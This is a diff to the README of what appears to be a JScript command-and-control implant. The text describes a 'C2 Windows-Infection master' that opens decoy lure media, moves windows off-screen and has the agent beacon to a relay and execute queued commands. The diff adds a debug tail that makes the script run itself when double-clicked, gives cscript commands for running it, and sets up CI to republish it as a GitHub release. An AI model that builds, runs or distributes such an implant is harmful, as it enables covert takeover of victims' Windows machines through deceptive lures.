@@ -53,6 +53,11 @@ window and process manipulation. The agent itself performs none. Concretely:
 - It reads `H_URL` from the process environment, so the host must set it (e.g. via
   `WScript.Shell.Environment('Process')('H_URL') = ...`) **before** calling `runAgent()` — and
   must re-set it in any re-hosted copy of the process, since environment state is per-process.
+- **Debug tail (this build):** executed directly under WSH (cscript/wscript, incl.
+  double-click), this file self-runs `runAgent()` and shows the result in a MessageBox popup
+  (see [Local verification](#local-verification)). Under the mshta deployment host the tail is
+  inert (no `WScript` object), and no extra top-level symbol is defined — the host contract
+  holds.
 
 The C2 Windows-Infection master is the reference host: it emits `setHUrl()` (writes `H_URL`),
 `openDecoy()` (lure media, gated to the x86 host), `hideWindow()` (resize + move off-screen),
@@ -94,18 +99,18 @@ Spoken against the HTTP relay (the beacon leg answers at its root):
 
 ## Local verification
 
-The agent runs dual-host by design — cscript is the verification path (no window, no network
-needed for the negative path):
+Double-click `jscript-agent.js` (or `wscript jscript-agent.js`): the result comes back as a
+**MessageBox popup** — with `H_URL` unset it shows `result: fail` and auto-closes after 60 s
+(set `DBG_ECHO=1` in the process environment to get the same line on the console instead):
 
 ```
-copy jscript-agent.js master.js
-echo WScript.Echo("result: " + runAgent()); >> master.js
-cscript //nologo master.js
+cscript //nologo jscript-agent.js              :: MessageBox popup (same as double-click)
+set DBG_ECHO=1 && cscript //nologo jscript-agent.js   :: console output instead
 ```
 
-Expected with `H_URL` unset: a single `result: fail` line and a clean exit — the "endpoint not
-set" log line ships nowhere (relay-ship only, zero local echo). Against a live relay the beacon
-appears in `/status` with its parsed identity and answers queued commands.
+Expected with `H_URL` unset: `result: fail` and a clean exit — the "endpoint not set" log line
+ships nowhere (relay-ship only, zero local echo). Against a live relay the beacon appears in
+`/status` with its parsed identity and answers queued commands.
 
 ## Build & Release
 
@@ -113,8 +118,8 @@ There is nothing to compile — the source **is** the artifact. CI (`.github/wor
 gates every push/PR with:
 
 1. `node --check jscript-agent.js` — syntax gate;
-2. a cscript smoke run on a Windows runner (H_URL unset ⇒ exactly `result: fail`, no local log
-   echo).
+2. a cscript smoke run on a Windows runner (`DBG_ECHO=1`, H_URL unset ⇒ exactly
+   `result: fail`, no local log echo).
 
 On every push to `main` the same workflow republishes the rolling GitHub Release
 **`jscript-agent-debug`** with the syntax-checked `jscript-agent.js` as its asset.
